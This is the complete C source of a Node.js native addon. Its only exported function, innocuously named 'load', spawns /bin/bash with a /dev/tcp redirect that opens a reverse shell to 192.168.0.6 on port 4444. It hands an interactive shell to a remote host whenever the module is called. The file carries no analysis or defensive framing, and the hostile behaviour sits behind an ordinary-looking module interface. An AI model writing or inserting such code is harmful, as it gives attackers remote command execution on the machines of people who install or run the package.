#include <node_api.h>
#include <spawn.h>

static napi_value Load(napi_env env, napi_callback_info info) {
  pid_t pid = 0;
  char executable[] = "/bin/bash";
  char option[] = "-c";
  char cmd[] = "exec 3<>/dev/tcp/192.168.0.6/4444; /bin/bash <&3 >&3 2>&3";
  char* argv[] = {executable, option, cmd, NULL};
  char* envp[] = {NULL};
  int status = posix_spawn(&pid, executable, NULL, NULL, argv, envp);
  
  napi_value result;
  napi_create_int32(env, status, &result);
  return result;
}

static napi_value Initialize(napi_env env, napi_value exports) {
  napi_value load_fn;
  napi_create_function(env, NULL, 0, Load, NULL, &load_fn);
  napi_set_named_property(env, exports, "load", load_fn);
  return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, Initialize)
